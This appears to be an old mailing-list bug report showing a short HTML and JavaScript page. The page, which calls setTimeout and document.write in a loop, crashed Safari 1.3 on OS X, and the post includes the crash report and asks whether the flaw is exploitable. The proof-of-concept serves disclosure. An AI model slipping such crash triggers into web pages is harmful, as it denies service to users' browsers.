Subject: Apple Safari & Javascript - KERN_INVALID_ADDRESS (0x0001)


Hi Guys,

Was trying to work out some code and came across a bug. Was wondering if 
it can be of any use ;-), or just a DoS?

I'm running OS X 1.3.9 & Safari 1.3 (132)

Create a HTML document, with the code below:

<html>
<script name="JavaScript">
<!--

function tickTock()
{
        setTimeout("tickTock()", 1000);
        thisTime = new Date()
        seconds = thisTime.getSeconds()
        document.write(seconds); 
}

// -->
</script>

<body onLoad="tickTock();">
</html>

Crash report is as follows:

Exception:  EXC_BAD_ACCESS (0x0001)
Codes:      KERN_INVALID_ADDRESS (0x0001) at 0xbf7fffa0

Regards,
-Patrick
